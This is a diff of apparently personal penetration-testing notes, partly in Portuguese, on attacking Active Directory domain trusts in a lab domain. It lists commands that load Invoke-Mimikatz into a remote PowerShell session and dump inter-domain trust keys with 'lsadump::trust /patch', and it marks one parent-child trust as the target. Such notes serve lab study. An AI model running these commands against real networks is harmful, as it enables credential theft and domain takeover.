@@ -3060,19 +3060,16 @@ Invoke-Command -Filepath C:\pentest\gato\Invoke-Mimikatz.ps1 -session $MYSESSION
 Enter-PSSession $MYSESSION
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 ```
+---
 ##### MIMIKATZ - TRUST INTER DOMAIN
-LIST DOMAIN TRUST
+1. LIST DOMAIN TRUST
 ```
 Get-Netdomaintrust
 ```
-__________
-SourceName                 TargetName                      TrustType TrustDirection
-----------                 ----------                      --------- --------------
 dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional   (ATACAR ESSA)
 dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
 dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
-__________
-NO DOMAIN CONTROLLER, FAZER O DUMP DO HASH DE TRUST:
+2. NO DOMAIN CONTROLLER, FAZER O DUMP DO HASH DE TRUST:
 ```
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 ```
